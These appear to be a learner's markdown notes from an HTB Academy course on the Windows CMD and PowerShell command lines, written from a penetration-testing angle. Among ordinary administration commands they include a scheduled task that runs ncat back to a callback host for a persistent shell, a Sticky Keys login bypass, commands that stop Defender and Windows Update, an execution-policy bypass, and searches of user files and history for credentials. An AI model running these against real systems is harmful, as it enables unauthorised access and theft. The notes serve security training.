# Introduction to Windows Command Line  <!-- -50 -->

> https://academy.hackthebox.com/course/preview/introduction-to-windows-command-line

<details>
<summary>Table of Contents</summary>

- [Introduction to Windows Command Line  ](#introduction-to-windows-command-line--)
  - [Introduction](#introduction)
    - [Intro](#intro)
  - [CMD](#cmd)
    - [Command Prompt Basics](#command-prompt-basics)
    - [Getting Help](#getting-help)
    - [System Navigation](#system-navigation)
    - [Working with Directories and Files](#working-with-directories-and-files)
    - [Gathering System Information - aka Host Enumeration](#gathering-system-information---aka-host-enumeration)
    - [Finding Files and Directories](#finding-files-and-directories)
    - [Environment Variables](#environment-variables)
    - [Managing Services](#managing-services)
    - [Working with Scheduled Tasks](#working-with-scheduled-tasks)
  - [PowerShell](#powershell)
    - [CMD Vs. PowerSHell](#cmd-vs-powershell)
    - [All About Cmdlets and Modules](#all-about-cmdlets-and-modules)
    - [User and Group Management](#user-and-group-management)
      - [Brief Intro to Active Directory](#brief-intro-to-active-directory)
    - [Working with Files and Directories](#working-with-files-and-directories)
    - [Finding \& Filtering Content](#finding--filtering-content)
    - [Working with Services](#working-with-services)
    - [Working with the Registry](#working-with-the-registry)
    - [Working with the Windows Event Log](#working-with-the-windows-event-log)
    - [Networking Management from the CLI](#networking-management-from-the-cli)
    - [Interacting with the Web](#interacting-with-the-web)
    - [PowerShell Scripting and Automation](#powershell-scripting-and-automation)
      - [PWSH Modules](#pwsh-modules)
  - [Finish Strong](#finish-strong)
    - [~~Skills Assessment~~](#skills-assessment)
    - [Beyond this Module](#beyond-this-module)


</details>

## Introduction

### Intro

- From a penetration testing perspective, we will learn how to utilize built-in Windows tools and commands and third-party scripts and applications to help with reconnaissance, exploitation, and exfiltration of data from within a Windows environment as we move into more advanced modules within HTB Academy.
- CMD Vs. PowerShell

| PowerShell                                                                  |	Command Prompt
| ---                                                                         | ---
| Introduced in 2006                                                          |	Introduced in 1981
| Can run both batch commands and PowerShell cmdlets                          |	Can only run batch commands
| Supports the use of command aliases                                         |	Does not support command aliases
| Cmdlet output can be passed to other cmdlets                                |	Command output cannot be passed to other commands
| All output is in the form of an object                                      |	Output of commands is text
| Able to execute a sequence of cmdlets in a script                           |	A command must finish before the next command can run
| Has an Integrated Scripting Environment (ISE)	                              | Does not have an ISE
| Can access programming libraries because it is built on the .NET framework  |	Cannot access these libraries
| Can be run on Linux systems	                                                | Can only be run on Windows systems


## CMD
### Command Prompt Basics

- MEMO: **Repair Mode** == CMD on boot from live disk <br> <!-- While useful, this also poses a potential risk. For example, on this Windows 7 machine, we can use the recovery Command Prompt to tamper with the filesystem. Specifically, replacing the Sticky Keys (sethc.exe) binary with another copy of cmd.exe. <br> Once the machine is rebooted, we can press Shift five times on the Windows login screen to invoke Sticky Keys. Since the executable has been overwritten, what we get instead is another Command Prompt - this time with NT AUTHORITY\SYSTEM permissions. We have bypassed any authentication and now have access to the machine as the super user. -->
- Local Access vs. Remote Access
  - Remote access is the equivalent of accessing the machine using virtual peripherals over the network. This level of access does not require direct physical access to the machine but requires the user to be connected to the same network or have a route to the machine they intend to access remotely. We can do this through the use of **telnet**(insecure and not recommended), Secure Shell (**SSH**), **PsExec**, **WinRM**, **RDP**, or other protocols as needed.
  - This convenience for sysadmins can also implant a security threat into our network. If these remote access tools are not configured correctly, or a threat gains access to valid credentials, an attacker can now have wide-ranging access to our environments. We must maintain the proper balance of availability and integrity of our networks for a proper security posture.

```cmd
REM This is a comment

dir
```

### Getting Help

- Offline

```cmd
help
help rem
ipconfig /?
```

- Online
  - [Microsoft Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)
  - [ss64](https://ss64.com/nt/)
- Tips & Tricks

```cmd
cls
<F7>
doskey /history
  REM https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/doskey
```


### System Navigation

<!-- TODO: DIRCMD -->

- Relevant commands

```cmd
dir
dir /A /P

cd || chdir

tree /F
```
- Relevant Directories


| Name                  |	Location                              |	Description
| ---                   | ---                                   | ---
| `%SYSTEMROOT%\Temp`   |	`C:\Windows\Temp`	                    | Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.
| `%TEMP%`	            | `C:\Users\<user>\AppData\Local\Temp`  | Local directory containing a user's temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.
| `%PUBLIC%`	          | `C:\Users\Public`	                    | Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it's less likely to be monitored for suspicious activity.
| `%ProgramFiles%`	    | `C:\Program Files`	                  | Folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.
| `%ProgramFiles(x86)%` | `C:\Program Files (x86)`              |	Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.


### Working with Directories and Files

- **Directories**
  - ...
  - `xcopy` can remove the Read-only bit from files when moving them
    - When performing the duplication, xcopy will reset any attributes the file had. If you wish to retain the file's attributes ( such as read-only or hidden ), you can use the `/K` switch.
  - `robocopy` can copy and move files locally, to different drives, and even across a network while retaining the file data and attributes to include timestamps, ownership, ACLs, and any flags set like hidden or read-only.
    - Utilizing the `/MIR` switch will complete the task for us. Be aware that it will mark the files as a system backup and hide them from view. We can clear the additional attributes if we add the `/A-:SH` switch to our command. Be careful of the `/MIR` switch, as it will mirror the destination directory to the source. Any file that exists within the destination will be removed. Ensure you place the new copy in a cleared folder. Above, we also used the `/L` switch. This is a what-if command. It will process the command you issue but not execute it; it just shows you the potential result. Let us give it a try below.


```cmd
cd
dir
tree /F

md new-directory  || mkdir new-directory

rd /S new-directory  || rmdir /S new-directory

move example C:\Users\htb\Documents\example
xcopy C:\Users\htb\Documents\example C:\Users\htb\Desktop\ /E
robocopy C:\Users\htb\Desktop C:\Users\htb\Documents\
REM robocopy /E /B /L C:\Users\htb\Desktop\example C:\Users\htb\Documents\Backup\
REM robocopy /E /MIR /A-:SH C:\Users\htb\Desktop\notes\ C:\Users\htb\Documents\Backup\Files-to-exfil\

```

> TODO: Attributes

- **Files**
  - [openfiles](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/openfiles)



```cmd
more /S secrets.txt
ipconfig /all | more
systeminfo | more

REM openfiles /local on; shutdown /r
openfiles

type secrets.txt
type secrets.txt >> leak.txt

echo foo > foo.txt
fsutil file createNeW for-sure.txt 222
  REM fsutil volume list

ren demo.txt superdemo.txt

find /i "see" < test.txt
```
```cmd
REM & == ;
ping 8.8.8.8 & type test.txt

REM && == &&
cd C:\Users\student\Documents\Backup && echo 'did this work' > yes.txt

REM || == ||
ping 192.168.1.1 || ping localhost
```
```cmd
del /F supdawg.txt || erase /F supdawg.txt

dir A/:R & del /A:R foo
dir A/:H & del /A:H bar
```
```cmd
copy /V secrets.txt C:\Users\student\Downloads\not-secrets.txt

move C:\Users\student\Desktop\bio.txt C:\Users\student\Downloads

```

### Gathering System Information - aka Host Enumeration

- Types of Information

```md
- What system information can we pull from our target host?
- What other system(s) is our target host interacting with over the network?
- What user account(s) do we have access to, and what information is accessible from the account(s)?
```

![chart](/HTB/Academy/InfoSecFoundations/img/05.01-InformationTypesChart.png)


| Type                        |	Description
| ---                         | ---
| General System Information  |	Contains information about the overall target system. Target system information includes but is not limited to the hostname of the machine, OS-specific details (name, version, configuration, etc.), and installed hotfixes/patches for the system.
| Networking Information      | Contains networking and connection information for the target system and system(s) to which the target is connected over the network. Examples of networking information include but are not limited to the following: host IP address, available network interfaces, accessible subnets, DNS server(s), known hosts, and network resources.
| Basic Domain Information	  | Contains Active Directory information regarding the domain to which the target system is connected.
| User Information	          | Contains information regarding local users and groups on the target system. This can typically be expanded to contain anything accessible to these accounts, such as environment variables, currently running tasks, scheduled tasks, and known services.

```md
- What user account do we have access to?
- What groups does our user belong to?
- What current working set of privileges does our user have access to?
- What resources can our user access over the network?
- What tasks and services are running under our user account?

> net share
- Do we have the proper permissions to access this share?
- Can we read, write, and execute files on the share?
- Is there any valuable data on the share?
```

> - After investigating our current compromised user account, we need to branch out a bit and see if we can get access to other accounts. In most environments, machines on a network are domain-joined. Due to the nature of domain-joined networks, anyone can log in to any physical host on the network without requiring a local account on the machine. We can use this to our advantage by scoping out what users have accessed our current host to see if we could access other accounts. This is very beneficial as a method of maintaining persistence across the network. To do this, we can utilize specific functionality of the `net` command.

```cmd
systeminfo
hostname
ver

ipconfig & ipconfig /all
arp /a

whoami /all
REM whoami /user & whoami /groups & whoami /priv

net user
net localgroup & net group

net share
REM net view
```

> - This is just a quick look at how CMD can be used to gain access and continue an assessment with limited resources. Keep in mind that this route is quite noisy, and we will be noticed eventually by even a semi-competent blue team. As it stands, we are writing tons of logs, leaving traces across multiple hosts, and have little to no insight into what their *EDR* and *NIDS* was able to see.


### Finding Files and Directories

```cmd
where nvim
where /R C:\Users\PabloQP\*.csv

find /N /I /V "IP Address" example.txt
findstr
```
```cmd
REM Compare by file byte size
comp file-1 file-2

REM Compare files and display their differences
fc /N file-1 file-2

REM Sort STDIN by input
sort file-1.md /O sort-1.md
sort sort-1.md /unique
```


### Environment Variables

- On a Windows host, environment variables are **NOT** case sensitive and can have spaces and numbers in the name. The only real catch we will find is that they cannot have a name that starts with a number or include an equal sign.
- *Scope* is a programming concept that refers to where variables can be accessed or referenced. 'Scope' can be broadly separated into two categories:
  - **Global** variables are accessible globally. In this context, the global scope lets us know that we can access and reference the data stored inside the variable from anywhere within a program.
  - **Local** variables are only accessible within a local context. Local means that the data stored within these variables can only be accessed and referenced within the function or context in which it has been declared.

```cmd
REM LOCAL ENV. VAR.
set SECRET=HTB{5UP3r_53Cr37_V4r14813}
echo %SECRET%
```
- Windows, like any other program, contains its own set of variables known as **Environment Variables**. These variables can be separated into their defined scopes known as *System* and *User* scopes. Additionally, there is one more defined scope known as the *Process* scope; however, it is volatile by nature and is considered to be a sub-scope of both the System and User scopes


| Scope                 |	Description |	Permissions Required to Access  |	Registry Location
| ---                   | ---         | ---                             | ---
| **System (Machine)**  |	The System scope contains environment variables defined by the Operating System (OS) and are accessible globally by all users and accounts that log on to the system. The OS requires these variables to function properly and are loaded upon runtime.	| Local Administrator or Domain Administrator	| `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment`
| **User**	            | The User scope contains environment variables defined by the currently active user and are only accessible to them, not other users who can log on to the same system.	| Current Active User, Local Administrator, or Domain Administrator	| `HKEY_CURRENT_USER\Environment`
| **Process**           |	The Process scope contains environment variables that are defined and accessible in the context of the currently running process. Due to their transient nature, their lifetime only lasts for the currently running process in which they were initially defined. They also inherit variables from the System/User Scopes and the parent process that spawns it (only if it is a child process).	| Current Child Process, Parent Process, or Current Active User	| `None (Stored in Process Memory)`

```cmd
set
echo %PATH%
```

- Both `set` and `setx` are command line utilities that allow us to display, set, and remove environment variables. The difference lies in how they achieve those goals. The set utility only manipulates environment variables in the current command line session. This means that once we close our current session, any additions, removals, or changes will not be reflected the next time we open a command prompt. Suppose we need to make permanent changes to environment variables. In that case, we can use setx to make the appropriate changes to the registry, which will exist upon restart of our current command prompt session.

```CMD
REM Process
set DCIP=172.16.5.2
echo %DCIP%

REM System/User
setx DCIP 172.16.5.2
setx DCIP ""
```

- Important Environment Variables ([ss64](https://ss64.com/nt/syntax-variables.html))

| Variable Name         |	Description
| ---                   | ---
| `%PATH%`	            | Specifies a set of directories(locations) where executable programs are located.
| `%OS%`	              | The current operating system on the user's workstation.
| `%SYSTEMROOT%`	      | Expands to C:\Windows. A system-defined read-only variable containing the Windows system folder. Anything Windows considers important to its core functionality is found here, including important data, core system binaries, and configuration files.
| `%LOGONSERVER%`	      | Provides us with the login server for the currently active user followed by the machine's hostname. We can use this information to know if a machine is joined to a domain or workgroup.
| `%USERPROFILE%`	      | Provides us with the location of the currently active user's home directory. Expands to C:\Users\{username}.
| `%ProgramFiles%`      |	Equivalent of C:\Program Files. This location is where all the programs are installed on an x64 based system.
| `%ProgramFiles(x86)%` |	Equivalent of C:\Program Files (x86). This location is where all 32-bit programs running under WOW64 are installed. Note that this variable is only accessible on a 64-bit host. It can be used to indicate what kind of host we are interacting with. (x86 vs. x64 architecture)


### Managing Services

```cmd
sc

tasklist
wmic
  REM STARTUP
```

- Being able to query services for information such as the process state, process id (pid), and service type is a valuable tool to have in our arsenal as an attacker. We can use this to check if certain services are running or check all existing services and drivers on the system for further information.
- Before we look specifically into checking the Windows Defender service, let's see what services are currently actively running on the system. We can do so by issuing the following command: `sc query type= service`.

```cmd
sc query type= service
sc query windefend
REM sc stop windefend
```

- Certain processes are protected under stricter access requirements than what local administrator accounts have. In this scenario, the only thing that can stop and start the Defender service is the [SYSTEM](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts#default-local-system-accounts) machine account.

```cmd
sc query Spooler
sc stop Spooler
sc start Spooler
```
- To configure services, we must use the [config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config) parameter in sc. This will allow us to modify the values of existing services, regardless if they are currently running or not. All changes made with this command are reflected in the Windows registry as well as the database for Service Control Manager (SCM). Remember that all changes to existing services will only fully update after restarting the service.

```cmd
sc query wuauserv
sc query bits

sc config wuauserv start= disabled
sc config bits start= disabled
REM sc config wuauserv start= auto
```

- **ELSE**

```cmd
tasklist /svc

net start

wmic service list brief
REM https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic

```


### Working with Scheduled Tasks

- The Task Scheduler allows us as admins to perform routine tasks without having to kick them off manually. The scheduler will monitor the host for a specific set of conditions called triggers and execute the task once the conditions are met.
- A great example of a use for schtasks would be providing us with a callback every time the host boots up. This would ensure that if our shell dies, we will get a callback from the host the next time a reboot occurs, making it likely that we will only lose access to the host for a short time if something happens or the host is shut down.



```md
# Triggers That Can Kick Off a Scheduled Task
When a specific system event occurs.
At a specific time.
At a specific time on a daily schedule.
At a specific time on a weekly schedule.
At a specific time on a monthly schedule.
At a specific time on a monthly day-of-week schedule.
When the computer enters an idle state.
When the task is registered.
When the system is booted.
When a user logs on.
When a Terminal Server session changes state.
```

- `schtasks`
  - `/query`
  - `/create`
  - `/change`
  - `/delete`


```cmd
SCHTASKS /Query /V /FO list

schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
REM Have schtasks execute Ncat locally, which we placed in the user's AppData directory, and connect to the host `172.16.1.100` on port `8100`. If successfully executed, this connection request should connect to our command and control framework (Metasploit, Empire, etc.) and give us shell access.

schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

tasks /delete  /tn "My Secret Task"
```

---

## PowerShell

### CMD Vs. PowerSHell

- [The Windows PowerShell ISE](https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/ise/introducing-the-windows-powershell-ise?view=powershell-7.2)


```md
PowerShell has become increasingly prominent among IT and Infosec professionals. It has widespread utility for System Administrators, Penetration Testers, SOC Analysts, and many other technical disciplines where ever Windows systems are administered. Consider IT admins and Windows system administrators administering IT environments made up of Windows servers, desktops (Windows 10 & 11), Azure, and Microsoft 365 cloud-based applications. Many of them are using PowerShell to automate tasks they must accomplish daily. Among some of these tasks are:
- Provisioning servers and installing server roles
- Creating Active Directory user accounts for new employees
- Managing Active Directory group permissions
- Disabling and deleting Active Directory user accounts
- Managing file share permissions
- Interacting with Azure AD and Azure VMs
- Creating, deleting, and monitoring directories & files
- Gathering information about workstations and servers
- Setting up Microsoft Exchange email inboxes for users (in the cloud &/or on-premises)
There are countless ways to use PowerShell from an IT admin context, and being mindful of that context can be helpful for us as penetration testers and even as defenders.
```

```powershell
# Getting Help
Get-Help Test-Wsman
Get-Help Test-Wsman -Online
Update-Help
Get-Help Test-Wsman

Get-Location  || gl  || pwd
Get-ChildItem || gci || ls
Set-Location  || sl  || cd
Get-Content   || gc  || cat

Get-Alias
Set-Alias -Name gh -Value Get-Help

Get-Command
Get-Command -verb get
Get-Command -noun windows*

Get-History
Get-Content (Get-PSReadlineOption).HistorySavePath || Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# One great feature of PSReadline from an admin perspective is that it will automatically attempt to filter any entries that include the strings: password, asplaintext, token, apikey, secret. This behavior is excellent for us as admins since it will help clear any entries from the PSReadLine history file that contain keys, credentials, or other sensitive information. The built-in session history does not do this.

Clear-Host  || cls  || clear

curl        #	Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.
fl and ft	  # These aliases can be used to format output into list and table outputs.
```

- Keybinds
```md
F2
Ctrl+R
Ctrl+L
Ctrl+Alt+Shit+?
Escape
```


### All About Cmdlets and Modules

- **cmdlets**
  - single-feature command that manipulates objects in PowerShell
  - Verb-Noun structure
- **modules**
  - A PowerShell module is structured PowerShell code that is made easy to use & share. As mentioned in the official Microsoft docs, a module can be made up of the following: Cmdlets, Script files, Functions, Assemblies, Related resources (manifests and help files)
  - https://github.com/PowerShellMafia/PowerSploit
    - `PowerSploit.psd1`
      - A PowerShell data file (.psd1) is a Module manifest file. Contained in a manifest file we can often find: Reference to the module that will be processed, Version numbers to keep track of major changes, The GUID, The Author of the module, Copyright, PowerShell compatibility information, Modules & cmdlets included, Metadata
    - `PowerSploit.psm1`


```powershell
$env:PSModulePath -replace ';', "`n"

Get-Module
Get-Module -ListAvailable

# mkdir $env:HOMEPATH\Documents\PowerShell\Modules
# git clone https://github.com/PowerShellMafia/PowerSploit.git $env:HOMEPATH\Documents\PowerShell\Modules\PowerSploit
# Import-Module PowerSploit
```

- **Execution Policy**
  - [15 Ways to Bypass the PowerShell Execution Policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

```powershell
Get-ExecutionPolicy -List
Set-ExecutionPolicy Undefined

Set-ExecutionPolicy Bypass -Scope Process

Get-Command -Module HTB
```

- **Finding Modules**
  - [PowerShell Gallery](https://www.powershellgallery.com/)

```powershell
Get-Command -Module PowerShellGet
Find-Module -Name AdminToolbox
Find-Module -Name AdminToolbox | Install-Module   # A

# https://github.com/BC-SECURITY/Empire/tree/main
# https://github.com/Kevin-Robertson/Inveigh
# ...
```

### User and Group Management

- Users and groups provide a wealth of opportunities regarding Pentesting a Windows environment. We will often see users misconfigured. They may be given excessive permissions, added to unnecessary groups, or have weak/no passwords set. Groups can be equally as valuable. Often groups will have nested membership, allowing users to gain privileges they may not need. These misconfigurations can be easily found and visualized with Tools like Bloodhound. For a detailed look at enumerating Users and Groups, check out the Windows Privilege Escalation module.
- As pentesters, understanding how to enumerate, interpret, and take advantage of users and groups is one of the easiest ways to gain access and elevate our privileges during a pentest engagement.
- User account types:
  - *Service Accounts*
  - *Built-in accounts*
  - *Local users*
  - *Domain users*
- **Built-in Accounts**

| Account               |	Description
| ---                   | ---
| *Administrator*       |	This account is used to accomplish administrative tasks on the local host.
| *Default Account*     |	The default account is used by the system for running multi-user auth apps like the Xbox utility.
| *Guest Account*	      | This account is a limited rights account that allows users without a normal user account to access the host. It is disabled by default and should stay that way.
| *WDAGUtility Account* |	This account is in place for the Defender Application Guard, which can sandbox application sessions.

#### Brief Intro to Active Directory

```md
In a nutshell, Active Directory (AD) is a directory service for Windows environments that provides a central point of management for users, computers, groups, network devices, file shares, group policies, devices, and trusts with other organizations. Think of it as the gatekeeper for an enterprise environment. Anyone who is a part of the domain can access resources freely, while anyone who is not is denied access to those same resources or, at a minimum, stuck waiting in the visitors center.

Within this section, we care about AD in the context of users and groups. We can administer them from PowerShell on any domain joined host utilizing the ActiveDirectory Module. Taking a deep dive into Active Directory would take more than one section, so we will not try here. To learn more about AD, you should check out the Introduction to Active Directory module.

# Local vs. Domain Joined Users

## How are they different?
Domain users differ from local users in that they are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on user and group membership. Domain user accounts can log in to any host in the domain, while the local user only has permission to access the specific host they were created on.
It is worth looking through the documentation on [accounts](https://learn.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts) to understand better how the various accounts work together on an individual Windows system and across a domain network. Take some time to look them over and understand the nuances between them. Understanding their uses and the utility of each type of account can make or break a pentesters attempt at privileged access or lateral movement during a penetration test.

## What Are User Groups?
Groups are a way to sort user accounts logically and, in doing so, provide granular permissions and access to resources without having to manage each user manually. For example, we could restrict access to a specific directory or share so that only users who need access can view the files. On a singular host, this does not mean much to us. However, logical grouping is essential to maintain a proper security posture within a domain of hundreds, if not thousands, of users. From a domain perspective, we have several different types of groups that can hold not only users but end devices like PCs, printers, and even other groups. This concept is too deep of a dive for this module. However, we will talk about how to manage groups for now.
```

- Like most other things in PowerShell, we use the `get`, `new`, and `set` verbs to find, create and modify users and groups. If dealing with local users and groups, `localuser` & `localgroup` can accomplish this. For domain assets, `aduser` & `adgroup` does the trick. If we were not sure, we could always use the `Get-Command *user*` cmdlet to see what we have access to.

```ps1
Get-LocalUser

# Admin PowerShell 5.1 ONLY!!

import-module microsoft.powershell.localaccounts -UseWindowsPowerShell    # https://github.com/PowerShell/PowerShell/issues/18624

$Password = Read-Host -AsSecureString
New-LocalUser -Name 'User02' -Password $Password -Description 'Description of this account.'

$Password = Read-Host -AsSecureString
$params = @ {
  Name = 'User03'
  Password = $Password
  FullName = 'Third User'
  Description 'Description of this account.'
}
New-LocalUser @params
```
```ps1
Get-LocalGroup
Get-LocalGroupMember -Name "Users"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Sara"
Get-LocalGroupMember -Name "Remote Desktop Users"
```

- Active Directory
  - [Get-ADUser](https://social.technet.microsoft.com/wiki/contents/articles/12037.active-directory-get-aduser-default-and-extended-properties.aspx)

> SERVER

```powershell
Get-WindowsCapability -Name RSAT.ActiveDirectory* -Online | Add-WindowsCapability -Online
Get-Module -Name ActiveDirectory -ListAvailable

  # Get-ADUser: Unable to find a default server with Active Directory Web Services running
Get-AdUser -Filter *
Get-ADUser -Identity TSilver
Get-ADUser -Filter {EmailAddress -Like '*greenhorn.corp'}

New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName  "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail

Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"
Get-ADUser -Identity MTanaka -Property Description
```

### Working with Files and Directories


| Command         |	Alias             |	Description
| ---             | ---               | ---
| `Get-Item`        |	gi	              | Retrieve an object (could be a file, folder, registry object, etc.)
| `Get-ChildItem`   |	ls / dir / gci	  | Lists out the content of a folder or registry hive.
| `New-Item`        |	md / mkdir / ni   |	Create new objects. ( can be files, folders, symlinks, registry entries, and more)
| `Set-Item`        |	si	              | Modify the property values of an object.
| `Copy-Item`       |	copy / cp / ci	  | Make a duplicate of the item.
| `Rename-Item`     |	ren / rni	        | Changes the object name.
| `Remove-Item`     |	rm / del / rmdir  |	Deletes the object.
| `Get-Content`     |	cat / type        |	Displays the content within a file or object.
| `Add-Content`     |	ac	              | Append content to a file.
| `Set-Content`     |	sc	              | overwrite any content in a file with new data.
| `Clear-Content`   |	clc	              | Clear the content of the files without deleting the file itself.
| `Compare-Object`  |	diff / compare	  | Compare two or more objects against each other. This includes the object itself and the content within.


```ps1
Get-Location; Set-Location .\Documents\
New-Item -ItemType Directory -Name "SOPs"; Set-Location .\SOPs\
mkdir "Physical Sec"; mkdir "Cyber Sec"; mkdir "Training";
Get-ChildItem

New-Item -ItemType File "README.md"
New-Item -ItemType File ".\Physical Sec\Physical-Sec-draft.md"
New-Item -ItemType File ".\Cyber Sec\Cyber-Sec-draft.md"
New-Item -ItemType File ".\Training\Employee-Training-draft.md"
tree /F

Add-Content .\README.md "Title: Insert Document Title Here
Date: x/x/202x
Author: MTanaka
Version: 0.1 (Draft)"  

Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md

get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
```

- **Permission Types**
  - *Full Control*: Full Control allows for the user or group specified the ability to interact with the file as they see fit. This includes everything below, changing the permissions, and taking ownership of the file.
  - *Modify*: Allows reading, writing, and deleting files and folders.
  - *List Folder Contents*: This makes viewing and listing folders and subfolders possible along with executing files. This only applies to folders.
  - *Read and Execute*: Allows users to view the contents within files and run executables (.ps1, .exe, .bat, etc.)
  - *Write*: Write allows a user the ability to create new files and subfolders along with being able to add content to files.
  - *Read*: Allows for viewing and listing folders and subfolders and viewing a file's contents.
  - *Traverse Folder*: Traverse allows us to give a user the ability to access files or subfolders within a tree but not have access to the higher-level folder's contents. This is a way to provide selective access from a security perspective.


### Finding & Filtering Content

- This section will dive into specifics of how PowerShell utilizes Objects, how we can filter based on Properties and content, and describe components like the PowerShell Pipeline further.
  - What is an *Object*? An object is an individual instance of a class within PowerShell. 
  - What is a *Class*? A class is the schema or 'unique representation of a thing (object) and how the sum of its properties define it. The blueprint used to lay out how that computer should be assembled and what everything within it can be considered a Class.
  - What are *Properties*? Properties are simply the data associated with an object in PowerShell.
  - What are *Methods*? Simply put, methods are all the functions our object has.

```ps1
# Get an Object (User) and its Properties/Methods
Get-LocalUser Administrator | Get-Member

# Propery Output (All)
Get-LocalUser Administrator | Select-Object -Property *

# Propery Output (Filtered)
Get-LocalUser * | Select-Object -Property Name,PasswordLastSet

# Sorting and Grouping
Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled
```
```ps1
get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | Format-List

Get-Service | where DisplayName -like '*Defender*'

# Services: determine if they are running, and even if we can, at our current permission level, affect the status of those services (turn them off, disable them, etc).
Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *
```

- **[Comparison Operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.2)**: `like` `contains` `equal` `match` `not`
  - ...
- `Select-String` == `findstr.exe` == `grep`

```ps1
Get-ChildItem -Path C:\Users\MTanaka -File -Recurse
Get-Childitem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}
Get-Childitem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where  {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"
Get-Childitem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"
```
```ps1
$pathsToCheck = @(
  "$env:HOMEPATH\AppData",      # config files, temp saves...
  "$env:HOMEPATH",              # vpn & ssh keys
)

Get-Content (Get-PSReadLineOption).HistorySavePath
Get-Clipboard
```

### Working with Services

- Services in the Windows Operating system at their core are singular instances of a component running in the background that manages and maintains processes and other needed components for applications used on the host. Services usually do not require interaction from the user and have no tangible interface for them to interact with. They also exist as a singular instance of the service on the host, while a service can maintain multiple instances of a process. A process can be considered a temporary container for a user or application to perform tasks.
- Windows has three categories of services: Local Services, Network Services, and System Services. Many different services (including the core components within the Windows operating system) handle multiple instances of processes simultaneously.
- PowerShell provides us with the module `Microsoft.PowerShell.Management`, which contains several cmdlets for interacting with Services. As with everything in PowerShell, if you are unsure where to start or what cmdlet you need, take advantage of the built-in help to get you started.

```ps1
Get-Help *-Service

Get-Service | Measure
Get-Service | ft DisplayName,Status

Get-Service | where DisplayName -like '*Defender*' | ft DisplayName,ServiceName,Status
# Start-Service WinDefend

get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName
Set-Service -Name Spooler -StartType Disabled
```
- Interacting Remotely

```ps1
Get-Service -ComputerName ACADEMY-ICL-DC
Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}

Invoke-Command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
```

### Working with the Registry

- Hierarchical tree of key-value pairs -- [registry hives](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) -- [registry value types](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-value-types) -- [predefined keys](https://learn.microsoft.com/en-us/windows/win32/sysinfo/predefined-keys)
- A host systems Registry **root keys** are stored in several different files and can be accessed from `C:\Windows\System32\Config\`. Along with these Key files, registry hives are held throughout the host in various other places.

```ps1
Get-ChildItem $env:WINDIR\System32\Config
```

| Name                |	Abbreviation  |	Description
| ---                 | ---           | ---
| HKEY_LOCAL_MACHINE  |	**HKLM**      |	This subtree contains information about the computer's physical state, such as hardware and operating system data, bus types, memory, device drivers, and more.
| HKEY_CURRENT_CONFIG |	**HKCC**      |	This section contains records for the host's current hardware profile. (shows the variance between current and default setups) Think of this as a redirection of the HKLM CurrentControlSet profile key.
| HKEY_CLASSES_ROOT   |	**HKCR**      |	Filetype information, UI extensions, and backward compatibility settings are defined here.
| HKEY_CURRENT_USER   |	**HKCU**      |	Value entries here define the specific OS and software settings for each specific user. Roaming profile settings, including user preferences, are stored under HKCU.
| HKEY_USERS          |	**HKU**       |	The default User profile and current user configuration settings for the local computer are defined under HKU.

- ACCESS THE INFORMATION
  - CLI: `reg.exe` `Get-Item` `Get-ItemProperty`

```ps1
